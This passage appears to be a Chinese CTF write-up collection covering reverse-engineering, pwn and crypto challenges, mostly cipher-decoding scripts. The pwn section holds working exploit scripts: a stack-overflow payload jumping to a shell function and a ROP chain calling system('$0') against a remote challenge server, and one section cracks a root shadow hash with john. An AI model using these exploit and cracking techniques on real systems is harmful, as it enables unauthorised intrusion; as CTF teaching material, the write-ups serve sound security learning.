Qg8LbC+8IdAQ6AucXgU4g57dve8s6Ah2BjsBBEegEclB4e+EdgY5AR+D8IvD/A/qMi5YevdI1AAAAAElFTkSuQmCC
```

是一个base64的照片格式，还原扫码得到flag:`bugku{inde_9882ihsd8-0}`



## love

下载下来发现一个reverse_3.exe文件，运行之后提示“没有相应的动态链接库”，查看文件类型

![1569136396861](1569136396861.png)

用ida打开，找到相应main函数的地方进行反编译，

![1569136521562](1569136521562.png)

输入接收是通过一个函数来实现的，点入查看，发现有一串函数连续调用，然后查看一些字符串，得到，发现：

![1569137652632](1569137652632.png)

怀疑上面的函数是经过base64加密而成，然后进行其他运算，最后与`e3nifIH9b_C@n@dH`进行比较，可得到相应flag，所以我们进行逆向：

```python
#encoding=utf8
import base64
 
str="e3nifIH9b_C@n@dH"
flag=""
 
for i in range(len(str)):
    flag+=chr(ord(str[i])-i)
flag=base64.b64decode(flag).decode("utf-8")
print("flag"+flag)
```



## Mountain climbing

查看文件类型：

![1569140529945](1569140529945.png)

用ida打开：

![1569140989972](1569140989972.png)

发现只有一个start，怀疑是加过壳，经过PEID扫描发现经过Upx压缩，用对应工具脱壳，之后用ida打开，进入main函数：

```C++
__int64 main_0()
{
  int v0; // edx
  __int64 v1; // ST04_8
  char v3; // [esp+0h] [ebp-160h]
  int v4; // [esp+D0h] [ebp-90h]
  int j; // [esp+DCh] [ebp-84h]
  int i; // [esp+E8h] [ebp-78h]
  char Str[104]; // [esp+F4h] [ebp-6Ch]

  //使用通用随机算法生成种子
  srand(0xCu);
  j_memset(&unk_423D80, 0, 0x9C40u);
  for ( i = 1; i <= 20; ++i )
  {
    for ( j = 1; j <= i; ++j )
      dword_41A138[100 * i + j] = rand() % 100000;
  }
  ((void (__cdecl *)(const char *, char))sub_41134D)("input your key with your operation can get the maximum:", v3);
  sub_411249("%s", (unsigned int)Str);
  //str的长度只有19
  if ( j_strlen(Str) == 19 )
  {
    //经过sub_41114F处理
    sub_41114F(Str);
    v4 = 0;
    j = 1;
    i = 1;
    dword_423D78 += dword_41A138[101];
    //遍历19个字符串，当当前字符是L时，dword_423D78如代码变化，如果不是L也不是R则停止，放出报错信息，如果是R则如代码变化，也就是说字符串中只有L和R两种字符。
    while ( v4 < 19 )
    {
      //76的ASCII是L
      if ( Str[v4] == 76 )
      {
        dword_423D78 += dword_41A138[100 * ++i + j];
      }
      else
      {
        //82的ASCII是R
        if ( Str[v4] != 82 )
        {
          ((void (__cdecl *)(const char *, char))sub_41134D)("error\n", v3);
          system("pause");
          goto LABEL_18;
        }
        dword_423D78 += dword_41A138[100 * ++i + ++j];
      }
      ++v4;
    }
    sub_41134D("your operation can get %d points\n", dword_423D78);
    system("pause");
  }
  else
  {
    ((void (__cdecl *)(const char *, char))sub_41134D)("error\n", v3);
    system("pause");
  }
LABEL_18:
  HIDWORD(v1) = v0;
  LODWORD(v1) = 0;
  return v1;
}
```

点入sub_41114F函数，一直点下去，发现一个这样的函数：

```c++
BOOL __cdecl sub_411750(LPCVOID lpAddress, int a2, int a3)
{
  int v3; // ST1C_4
  DWORD flOldProtect; // [esp+D4h] [ebp-2Ch]
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+E0h] [ebp-20h]

  VirtualQuery(lpAddress, &Buffer, 0x1Cu);
  VirtualProtect(Buffer.BaseAddress, Buffer.RegionSize, 0x40u, &Buffer.Protect);
  while ( 1 )
  {
    //
    v3 = a2--;
    if ( !v3 )
      break;
    *(_BYTE *)lpAddress ^= a3;
    lpAddress = (char *)lpAddress + 1;
  }
  return VirtualProtect(Buffer.BaseAddress, Buffer.RegionSize, Buffer.Protect, &flOldProtect);
}
```





# Pwn

## pwn1

访问nc 114.116.54.89 10001

打印一下当前目录的文件，会发现：

![1563351851778](1563351851778.png)

直接 cat flag即可

flag{6979d853add353c9}



## PWN2

![1563355105656](1563355105656.png)

下载文件，看一下开了什么防护：

![1563355147688](1563355147688.png)

没有栈溢出防护，随机化地址也没有。

用ida打开看看：

![1563355286144](1563355286144.png)

发现这个文件存在shell，所以大概思路就是利用read函数溢出覆盖到getshell的位置，由于这是调用静态的链接库，所以相对位移是不变的，直接可以得到此时shell的位置

![1563355758994](1563355758994.png)

看看read函数中的参数s的数组大小：

```bash
-0000000000000030 s               db ?
-000000000000002F                 db ? ; undefined
-000000000000002E                 db ? ; undefined
-000000000000002D                 db ? ; undefined
-000000000000002C                 db ? ; undefined
-000000000000002B                 db ? ; undefined
-000000000000002A                 db ? ; undefined
-0000000000000029                 db ? ; undefined
-0000000000000028                 db ? ; undefined
-0000000000000027                 db ? ; undefined
-0000000000000026                 db ? ; undefined
-0000000000000025                 db ? ; undefined
-0000000000000024                 db ? ; undefined
-0000000000000023                 db ? ; undefined
-0000000000000022                 db ? ; undefined
-0000000000000021                 db ? ; undefined
-0000000000000020                 db ? ; undefined
-000000000000001F                 db ? ; undefined
-000000000000001E                 db ? ; undefined
-000000000000001D                 db ? ; undefined
-000000000000001C                 db ? ; undefined
-000000000000001B                 db ? ; undefined
-000000000000001A                 db ? ; undefined
-0000000000000019                 db ? ; undefined
-0000000000000018                 db ? ; undefined
-0000000000000017                 db ? ; undefined
-0000000000000016                 db ? ; undefined
-0000000000000015                 db ? ; undefined
-0000000000000014                 db ? ; undefined
-0000000000000013                 db ? ; undefined
-0000000000000012                 db ? ; undefined
-0000000000000011                 db ? ; undefined
-0000000000000010                 db ? ; undefined
-000000000000000F                 db ? ; undefined
-000000000000000E                 db ? ; undefined
-000000000000000D                 db ? ; undefined
-000000000000000C                 db ? ; undefined
-000000000000000B                 db ? ; undefined
-000000000000000A                 db ? ; undefined
-0000000000000009                 db ? ; undefined
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
-0000000000000004                 db ? ; undefined
-0000000000000003                 db ? ; undefined
-0000000000000002                 db ? ; undefined
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

也就是说，覆盖0x30+0x8才能进入return,所以直接可以写脚本：

```python
from pwn import *
p = remote('114.116.54.89','10003')
payload = 'a'*0x38+p64(0x400751)
p.recvline()
p.sendline(payload)
p.interactive()
```

`flag{n0w_y0u_kn0w_the_Stack0verfl0w}`



## PWN4

下载文件，查看一下保护机制：

![1563436338733](1563436338733.png)

没有栈溢出防护，可执行，没有地址随机化，有代码可执行段。

在ida64中打开，先看看main函数：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char s; // [rsp+0h] [rbp-10h]
  memset(&s, 0, 0x10uLL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  puts("Come on,try to pwn me");
  read(0, &s, 0x30uLL);
  puts("So~sad,you are fail");
  return 0LL;
}
```

没有栈溢出防护,而且有read函数，可以进行栈溢出，现在我们需要找到可以执行的shell位置，

`shift+F12` 查看文件中的字符串，看看有没有可疑字符串:

![1563439194047](1563439194047.png)

里面发现存在system函数，以及敏感字`$0` ，`$0`在linux中为**为shell或shell脚本的名称**。`system()`会调用`fork()`产生子进程，由子进程来调用`/bin/sh -c string`来执行参数`string`字符串所代表的命令，此命令执行完后随即返回原调用的进程。

所以如果将`$0`作为`system`的参数，能达到传入`'/bin/sh'`一样的效果。

接着我们就可以开始传入参数，**64位是利用寄存器进行传参，32位使用栈进行传参**

这里我们需要找到`pop | ret` 来进行相应的赋值,利用ROPgadget:

```bash
kali:Desktop # ROPgadget --binary pwn4 --only 'pop|ret'
Gadgets information
============================================================
0x00000000004007cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007ce : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007d0 : pop r14 ; pop r15 ; ret
0x00000000004007d2 : pop r15 ; ret
0x00000000004007cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007cf : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400630 : pop rbp ; ret
0x00000000004007d3 : pop rdi ; ret   #选用这个
0x00000000004007d1 : pop rsi ; pop r15 ; ret
0x00000000004007cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400541 : ret
```

这里注意一下原因：我们需要找出 `pop | ret`来进行传值，而上述只有`rdi`是可以存入数据，`rbp`和`r15`是called saved 

然后我们还需要找到`$0`的位置和调用system函数的位置

![1563441211421](1563441211421.png)

```bash
kali:Desktop # ROPgadget --binary pwn4 --string '\$0'
Strings information
============================================================
0x000000000060111f : $0
```

现在可以开始写脚本：

```python
from pwn import *

p = remote('114.116.54.89','10004')

pop_rdi = 0x00000000004007d3
sys_addr = 0x40075A
sh_addr = 0x000000000060111f

payload = 'a'*0x18 + p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)
p.recvline()
p.sendline(payload)
p.interactive()
```

得到`flag{264bc50112318cd6e1a67b0724d6d3af}`



# Crypto



## easy_crypto

```python
0010 0100 01 110 1111011 11 11111 010 000 0 001101 1010 111 100 0 001101 01111 000 001101 00 10 1 0 010 0 000 1 01111 10 11110 101011 1111101
```

打开链接，发现这样的一段字符串，可以看出是莫斯电码，

​                                    ![1564762933081](1564762933081.png)        

根据上表进行相应的解码程序：

```python
#owner=houhuiting
#type=abstract
string=input()
key=string.split(" ")
dictionary= {'01': 'A',
        '1000': 'B',
        '1010': 'C',
        '100':'D',
        '0':'E',
        '0010':'F',
        '110': 'G',
        '0000': 'H',
        '00': 'I',
        '0111':'J',
        '101': 'K',
        '0100': 'L',
        '11': 'M',
        '10': 'N',
        '111': 'O',
        '0110': 'P',
        '1101': 'Q',
        '010': 'R',
        '000': 'S',
        '1': 'T',
        '001': 'U',
        '0001': 'V',
        '011': 'W',
        '1001': 'X',
        '1011': 'Y',
        '1100': 'Z',
        '01111': '1',
        '00111': '2',
        '00011': '3',
        '00001': '4',
        '00000': '5',
        '10000': '6',
        '11000': '7',
        '11100': '8',
        '11110': '9',
        '11111': '0',
        '001100': '?',
        '10010': '/',
        '101101': ')',
        '100001': '-',
        '010101': '.',
        '110011':',',
        '011010':'@',
        '111000':':',
        '101010':':',
        '10001':'=',
        '011110':"'",
        '101011':'!',
        '001101':'_',
        '010010':'"',
        '10110':'(',
        '1111011':'{',
        '1111101':'}'
        }; 
for item in key:
#   print(dictionary[item],end='')
    print(dictionary[item].lower(),end='')
```

解出flag:`FLAG{M0RSE_CODE_1S_INTEREST1N9!}`

但是交上去是错的，换成小写试试，`flag{m0rse_code_1s_interest1n9!}`成功



## 散乱的密文

> lf5{ag024c483549d7fd@@1}
> 一张纸条上凌乱的写着2 1 6 5 3 4

|  2   |  1   |  6   |  5   |  3   |  4   |
| :--: | :--: | :--: | :--: | :--: | :--: |
|  l   |  f   |  5   |  {   |  a   |  g   |
|  0   |  2   |  4   |  c   |  4   |  8   |
|  3   |  5   |  4   |  9   |  d   |  7   |
|  f   |  d   |  @   |  @   |  1   |  }   |

按照上述顺序弄出，得到`flag{52048c453d794df1}`

ps: 将后面两个@@去掉



## 凯撒部长的奖励

给出一串字符串：

```python
MSW{byly_Cm_sIol_lYqUlx_yhdIs_Cn_Wuymul_il_wuff_bcg_pCwnIl_cm_u_Yrwyffyhn_guh_cz_sio_quhn_ni_ayn_bcm_chzilguncihm_sio_wuh_dich_om}
```

直接凯撒解密:

```python
SYC{here_Is_yOur_rEwArd_enjOy_It_Caesar_or_call_him_vIctOr_is_a_Excellent_man_if_you_want_to_get_his_informations_you_can_join_us}
```



## 一段base64

打开解题链接，发现有个`flag.txt`，说是`base64`，直接解码(用在线网站解码的话很容易卡死，可能是数据太多)

这里决定用python脚本来完成解密，后面紧跟着一堆加密形式，在脚本中呈现效果

```python
#coding=utf-8
import urllib.parse
import base64
import re

#第一层base64解密
with open('1.txt') as f:
    cipher1 = f.read().encode('utf-8')
plain1 = base64.b64decode(cipher1).decode("utf-8")

# print(plain1)
# 只有0-7数字 ，怀疑是八进制解码，试试看
cipher2 = plain1
cipher2 = re.findall(r'\d+',cipher2)
# print(cipher2)
plain2 = ''
for i in cipher2:
    plain2 += chr(int(i,8))
# print(plain2)
#现在解出来之后编程了16进制，再次解码
cipher3 = plain2
cipher3 = re.findall(r'\d+',cipher3)
# print(cipher3)
plain3 = ''
for i in cipher3:
    plain3 += chr(int(i,16))
# print(plain3)

#现在得到的编码格式是udd*，推测为unicode
cipher4 = plain3
cipher4 = re.findall(r'u[\d\w]+',cipher4)
cipher4 = ''.join(cipher4).replace(r'u',r'\u')
# print(cipher4)
# python3没有decode可用，所以这里就这样弄了
plain4 = cipher4.encode('utf-8').decode("unicode_escape")
# print(plain4)

#将得到的数字转成ASCII
cipher5 = re.findall(r'\d+',plain4)
plain5 = ''
for i in cipher5:
    plain5+=chr(int(i))
# print(plain5)

#现在是url16进制
cipher6 = re.findall(r'\d+\w?',plain5)
plain6 = ''
for i in cipher6:
    plain6 += chr(int(i,16))
# print(plain6)

#现在是url 10进制，将其转化为ASCII即可
cipher7 = re.findall(r'\d+',plain6)
plain7 = ''
for i in cipher7:
    plain7 += chr(int(i))
plain7 = urllib.parse.unquote(plain7)
print(plain7)
```

![1568913099204](1568913099204.png)

`flag{ctf_tfc201717qwe}`



## .!?

![1570279907943](1570279907943.png)

一个ook形式的加密，直接在线解密

![1570279971465](1570279971465.png)



## +[]-

![1570280133069](1570280133069.png)

一段brainfuck加密，还是在线解密

![1570280252723](1570280252723.png)





## 奇怪的密码

![1570280637305](1570280637305.png)

看到这种没见过的古典密码，习惯先看看ASCII，看上面的字符串，€符号像{，那么前面四个字母可能就是flag

| 字母 | ASCII | 字母 | ASCII |
| :--: | :---: | :--: | :---: |
|  g   |  103  |  f   |  102  |
|  n   |  110  |  l   |  108  |
|  d   |  100  |  a   |  97   |
|  k   |  107  |  g   |  103  |

发现，这四个貌似间隔是1，2，3，4

所以想着是不是顺次替换，直接在python上通过`chr`会产生报错，因为€的编码是8364，chr只能处理256之内的ASCII，所以我们将相应编码通过程序得到：

`102 108 97 103 8359 108 101 105 95 99 105 95 106 105 97 109 105`

然后通过在线工具进行解密：

![1570590553945](1570590553945.png)

得到文本信息：`flag₧lei_ci_jiami`

尝试flag格式，最后得到`flag{lei_ci_jiami}`



## 托马斯.杰斐逊

![1570590946343](1570590946343.png)

用一般方法试着解密，发现结果是错误的。

百度一下托马斯·杰斐逊，发现：

![1570622091414](1570622091414.png)

现在开始直接利用该方法进行解密：

1. 先将字母表按照密钥顺序排列：

   ```pyhton
   2： <KPBELNACZDTRXMJQOYHGVSFUWI <
   5： <IHFRLABEUOTSGJVDKCPMNZQWXY <
   1： <ZWAXJGDLUBVIQHKYPNTCRMOSFE <
   3： <BDMAIZVRNSJUWFHTEQGYXPLOCK <
   6： <AMKGHIWPNYCJBFZDRUSLOQXVET <
   4： <RPLNDVHGFCUKTEBSXQYIZMJWAO <
   9： <QWATDSRFHENYVUBMCOIKZGJXPL <
   7： <GWTHSPYBXIZULVKMRAFDCEONJQ <
   8： <NOZUTWDCVRJLXKISEFAPMYGHBQ <
   14： <XPHKZGJTDSENYVUBMLAOIRFCQW <
   10： <WABMCXPLTDSRJQZGOIKFHENYVU <
   13： <BMCSRFHLTDENQWAOXPYVUIKZGJ <
   11： <XPLTDAOIKFZGHENYSRUBMCQWVJ <
   12： <TDSWAYXPLVUBOIKZGJRFHENMCQ <
   ```

2. 然后根据密文将每行的首字母变为相应密文

   ```python
   HGVSFUWIKPBELNACZDTRXMJQOY
   CPMNZQWXYIHFRLABEUOTSGJVDK
   BVIQHKYPNTCRMOSFEZWAXJGDLU
   TEQGYXPLOCKBDMAIZVRNSJUWFH
   SLOQXVETAMKGHIWPNYCJBFZDRU
   XQYIZMJWAORPLNDVHGFCUKTEBS
   WATDSRFHENYVUBMCOIKZGJXPLQ
   CEONJQGWTHSPYBXIZULVKMRAFD
   RJLXKISEFAPMYGHBQNOZUTWDCV
   QWXPHKZGJTDSENYVUBMLAOIRFC
   GOIKFHENYVUWABMCXPLTDSRJQZ
   LTDENQWAOXPYVUIKZGJBMCSRFH
   ENYSRUBMCQWVJXPLTDAOIKFZGH
   SWAYXPLVUBOIKZGJRFHENMCQTD
   ```

   ![1570624454125](1570624454125.png)

   得到`flag{XSXSBUGKUADMIN}`

   输入发现不对，但题目明确说了是解密的内容，最后发现flag是小写，

   `flag{xsxsbugkuadmin}`



## zip伪加密

直接在winhex中修改：

![1570626145427](1570626145427.png)

将图中所示改成00即可

解压得到`flag{Adm1N-B2G-kU-SZIP}`



## 告诉你个秘密(ISCCCTF)

得到下面这样的字符串：

```txt
63 6A 56 35 52 79 42 73 63 44 6C 4A 49 45 4A 71 54 53 42 30 52 6D 68 43
56 44 5A 31 61 43 42 35 4E 32 6C 4B 49 46 46 7A 57 69 42 69 61 45 30 67
```

看起来就像是16进制，使用16进制进行编码，然后将其变为ASCII

```txt
cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g
```

开始以为是md5，发现不能解密，尝试常用的加密方式进行解密，发现是base64，

```txt
r5yG  lp9I  BjM  tFhB T6uh y7iJ QsZ bhM
```

发现r5yg中间包含的是字母T,将所有的解出为`tongyuan`，

发现不对，试试大写：`TONGYUAN`，发下flag格式就是大写



## 这不是md5

```txt
66 6c 61 67 7b 61 65 37 33 35 38 37 62 61 35 36 62 61 65 66 35 7d
```

发现跟上题思路类似，解出`flag{ae73587ba56baef5}`



## 贝斯家族

```txt
@iH<,{bdR2H;i6*Tm,Wx2izpx2!
```

将知道的base16,32,64都尝试一遍，发现不能解码，尝试base58,91,最后发现是base91编码，解密网站是：`http://ctf.ssleye.com/base91.html`，但是可能需要收费

还有一种选择是，下载这个解码软件：

- `http://base91.sourceforge.net/`

`flag{554a5058c9021c76}`



## 富强民主

这是一个核心价值观编码

直接在线解密：`flag{90025f7fb1959936}`



## python

得到两个文件

`challenge.py`

```python
from N1ES import N1ES
import base64
key = 
#利用函数将key进行加密
n1es = N1ES(key)
flag = "N1CTF{*****************************************}"
cipher = n1es.encrypt(flag)
print base64.b64encode(cipher) #HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx
```

`N1ES.py`

```python
# -*- coding: utf-8 -*-
def round_add(a, b):
    f = lambda x, y: x + y - 2 * (x & y)
    res = ''
    for i in range(len(a)):
        res += chr(f(ord(a[i]), ord(b[i])))
    return res

def permutate(table, block):
	return list(map(lambda x: block[x], table))

def string_to_bits(data):
    #将key中的变为ASCII
    data = [ord(c) for c in data]
    #一个字符是一个字节，一个字节是八位
    l = len(data) * 8
    #将其中的所有位置为0
    result = [0] * l
    pos = 0
    for ch in data:
        for i in range(0,8):
            #将其中每个bit进行处理
            #但是这里的(ch>>i) & 1 -->貌似把&1去掉也没有什么问题
            result[(pos<<3)+i] = (ch>>i) & 1
        pos += 1
    return result

s_box = [54, 132, 138, 83, 16, 73, 187, 84, 146, 30, 95, 21, 148, 63, 65, 189, 188, 151, 72, 161, 116, 63, 161, 91, 37, 24, 126, 107, 87, 30, 117, 185, 98, 90, 0, 42, 140, 70, 86, 0, 42, 150, 54, 22, 144, 153, 36, 90, 149, 54, 156, 8, 59, 40, 110, 56,1, 84, 103, 22, 65, 17, 190, 41, 99, 151, 119, 124, 68, 17, 166, 125, 95, 65, 105, 133, 49, 19, 138, 29, 110, 7, 81, 134, 70, 87, 180, 78, 175, 108, 26, 121, 74, 29, 68, 162, 142, 177, 143, 86, 129, 101, 117, 41, 57, 34, 177, 103, 61, 135, 191, 74, 69, 147, 90, 49, 135, 124, 106, 19, 89, 38, 21, 41, 17, 155, 83, 38, 159, 179, 19, 157, 68, 105, 151, 166, 171, 122, 179, 114, 52, 183, 89, 107, 113, 65, 161, 141, 18, 121, 95, 4, 95, 101, 81, 156, 17, 190, 38, 84, 9, 171, 180, 59, 45, 15, 34, 89, 75, 164, 190, 140, 6, 41, 188, 77, 165, 105, 5, 107, 31, 183, 107, 141, 66, 63, 10, 9, 125, 50, 2, 153, 156, 162, 186, 76, 158, 153, 117, 9, 77, 156, 11, 145, 12, 169, 52, 57, 161, 7, 158, 110, 191, 43, 82, 186, 49, 102, 166, 31, 41, 5, 189, 27]

def generate(o):
    k = permutate(s_box,o)
    b = []
    for i in range(0, len(k), 7):
        b.append(k[i:i+7] + [1])
    c = []
    for i in range(32):
		pos = 0
		x = 0
		for j in b[i]:
			x += (j<<pos)
			pos += 1
		c.append((0x10001**x) % (0x7f))
    return c

class N1ES:
    def __init__(self, key):
        #判断一下key的长度是否是24
        if (len(key) != 24 or isinstance(key, bytes) == False ):
            raise Exception("key must be 24 bytes long")
        self.key = key
        #生成密钥
        self.gen_subkey()

    def gen_subkey(self):
        #将字符串变为bits
        o = string_to_bits(self.key)
        k = []
        for i in range(8):
	        o = generate(o)
        	k.extend(o)
        	o = string_to_bits([chr(c) for c in o[0:24]])
        self.Kn = []
        for i in range(32):
            self.Kn.append(map(chr, k[i * 8: i * 8 + 8]))
        return 

    def encrypt(self, plaintext):
        if (len(plaintext) % 16 != 0 or isinstance(plaintext, bytes) == False):
            raise Exception("plaintext must be a multiple of 16 in length")
        res = ''
        for i in range(len(plaintext) / 16):
            block = plaintext[i * 16:(i + 1) * 16]
            L = block[:8]
            R = block[8:]
            for round_cnt in range(32):
                L, R = R, (round_add(L, self.Kn[round_cnt]))
            L, R = R, L
            res += L + R
        return res
```

这题就当作经验积累吧，这是个`Feistel `密码，他的加密和解密的算法是相同的，只是需要将密钥取反而已

```python
# -*- coding: utf-8 -*-
import base64
def round_add(a,b):
	f = lambda x,y: x + y - 2 * (x & y)
	res = ''
	for i in range(len(a)):
		res += chr(f(ord(a[i]),ord(b[i])))
	return res

def permutate(table,block):
	return list(map(lambda x: block[x], table))

def string_to_bits(data):
	data = [ord(c) for c in data]
	l = len(data)*8
	result = [0] * l
	pos = 0
	for ch in data:
		for i in range(0,8):
			result[(pos<<3)+i] = (ch>>i) & 1
		pos += 1
	return result

s_box = [54, 132, 138, 83, 16, 73, 187, 84, 146, 30, 95, 21, 148, 63, 65, 189, 188, 151, 72, 161, 116, 63, 161, 91, 37, 24, 126, 107, 87, 30, 117, 185, 98, 90, 0, 42, 140, 70, 86, 0, 42, 150, 54, 22, 144, 153, 36, 90, 149, 54, 156, 8, 59, 40, 110, 56,1, 84, 103, 22, 65, 17, 190, 41, 99, 151, 119, 124, 68, 17, 166, 125, 95, 65, 105, 133, 49, 19, 138, 29, 110, 7, 81, 134, 70, 87, 180, 78, 175, 108, 26, 121, 74, 29, 68, 162, 142, 177, 143, 86, 129, 101, 117, 41, 57, 34, 177, 103, 61, 135, 191, 74, 69, 147, 90, 49, 135, 124, 106, 19, 89, 38, 21, 41, 17, 155, 83, 38, 159, 179, 19, 157, 68, 105, 151, 166, 171, 122, 179, 114, 52, 183, 89, 107, 113, 65, 161, 141, 18, 121, 95, 4, 95, 101, 81, 156, 17, 190, 38, 84, 9, 171, 180, 59, 45, 15, 34, 89, 75, 164, 190, 140, 6, 41, 188, 77, 165, 105, 5, 107, 31, 183, 107, 141, 66, 63, 10, 9, 125, 50, 2, 153, 156, 162, 186, 76, 158, 153, 117, 9, 77, 156, 11, 145, 12, 169, 52, 57, 161, 7, 158, 110, 191, 43, 82, 186, 49, 102, 166, 31, 41, 5, 189, 27]

def generate(o):
	k = permutate(s_box,o)
	b = []
	for i in range(0,len(k),7):
		b.append(k[i:i+7]+[1])
	c = []
	for i in range(32):
		pos = 0
		x = 0
		for j in b[i]:
			x += (j<<pos)
			pos += 1
		c.append((0x10001**x) % (0x7f))
	return c

class N1ES:
	def __init__(self,key):
		if (len(key) != 24 or isinstance(key,bytes) == False):
			raise Exception("key must be 24 bytes long")
		self.key = key
		self.gen_subkey()
	
	def gen_subkey(self):
		o = string_to_bits(self.key)
		k = []
		for i in range(8):
			o = generate(o)
			k.extend(o)
			o = string_to_bits([chr(c) for c in o[0:24]])
		self.Kn = []
		for i in range(32):
			self.Kn.append(map(chr,k[i*8: i*8+8]))
		return
	
	def decrypt(self,plaintext):
		res = ''
		for i in range(len(plaintext)/16):
			block = plaintext[i*16:(i + 1)*16]	
			L = block[:8]
			R = block[8:]
			for round_cnt in range(32):
                #只需要将此处的取反即可
				L,R = R, (round_add(L, self.Kn[31-round_cnt]))
			L,R = R,L
			res += L + R
		return res


key = "wxy191iss00000000000cute"
nles = N1ES(key)
flag = base64.b64decode("HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx")
flag = nles.decrypt(flag)
print flag
#N1CTF{F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/} 
```

还有一种方法就是直接都算法，进行暴力破解：

```python
import base64,string,N1ES
key = "wxy191iss00000000000cute"
c = base64.b64decode("HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx")
n1es = N1ES.N1ES(key)
f=""
for i in xrange(3):
    for j in xrange(16):
        for k in string.printable:
            s="x"*i*16+"x"*j+k+"x"*(48-i*16-j-1)
            e=n1es.encrypt(s)
            check=c[i*16+j+8]==e[i*16+j+8] if j<8 else c[i*16+j-8]==e[i*16+j-8]
            if check:
                f+=k
                break
print f
# N1CTF{F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/}
```





## 进制转换

```python
d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e
```

直接python脚本解密即可

```python
#coding=utf-8

data = 'd87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e'
enc = data.split(' ')
ans =''

for i in enc:
    tag = i[0]
    if tag == 'x':
        ans += chr(int(i[1:],16))
    elif tag == 'o':
        ans += chr(int(i[1:],8))
    elif tag == 'b':
        ans += chr(int(i[1:],2))
    elif tag == 'd':
        ans += chr(int(i[1:]))
print(ans)
```

得到`Welcome to kelaibei. Give you a flag as a gift.  flag{1e4bf81a6394de5abc005ac6e39a387b} . Have a good time~ `



## affine

![1570682541529](1570682541529.png)

题目是仿射，所以猜想是flag里面内容需要仿射密码，用脚本解决

```python
#coding=utf-8

enc = 'szzyfimhyzd'
ans = ''
for x in enc:
	x = ord(x)
	for i in range(0,26):
		if x == (17*i-8)%26+97:
			ans += chr(i+97)

print(ans)
```

得到flag:

```txt
flag{affineshift}
```



## Crack it

下载一个shadow文件，查一下有关信息：

**Linux操作系统下有一个文件负责所有用户的密码。那就是shadow。该文件的权限必须设置为：-r- — — （400）或者 -rw — —（600）即：Linux /etc/shadow文件是只有系统管理员才有权利进行查看和修改的文件。**

使用more命令查看其中一些基本信息：

```bash
root@DESKTOP-OORTB87:/mnt/c/Users/X1TABLET/Desktop# more shadow                           root:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7::: 
```

这里使用kali中john工具进行密码爆破：

```bash
root@DESKTOP-OORTB87:/mnt/c/Users/X1TABLET/Desktop# john shadow                                                                                                                  Using default input encoding: UTF-8                                                                                                                                              Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])                                                                                                      Cost 1 (iteration count) is 5000 for all loaded hashes                                                                                                                           Will run 4 OpenMP threads                                                                                                                                                        Proceeding with single, rules:Single                                                                                                                                             Press 'q' or Ctrl-C to abort, almost any other key for status                                                                                                                    Warning: Only 14 candidates buffered for the current salt, minimum 16 needed for performance.                                                                                    Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance.                                                                                    Warning: Only 15 candidates buffered for the current salt, minimum 16 needed for performance.                                                                                    Almost done: Processing the remaining buffered candidate passwords, if any.                                                                                                      Warning: Only 8 candidates buffered for the current salt, minimum 16 needed for performance.                                                                                     Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist                                                                                                            hellokitty       (root)    //这里有内容                                                                                                                                             1g 0:00:00:04 DONE 2/3 (2019-10-11 19:50) 0.2427g/s 1337p/s 1337c/s 1337C/s ilovegod..ford                                                                                       Use the "--show" option to display all of the cracked passwords reliably                                                                                                         Session completed 
```

`ps:`如果之前已经执行过上面命令，想再次看结果，可以使用`john shadow --show`

所以`flag{hellokitty}`



## RSA

```txt
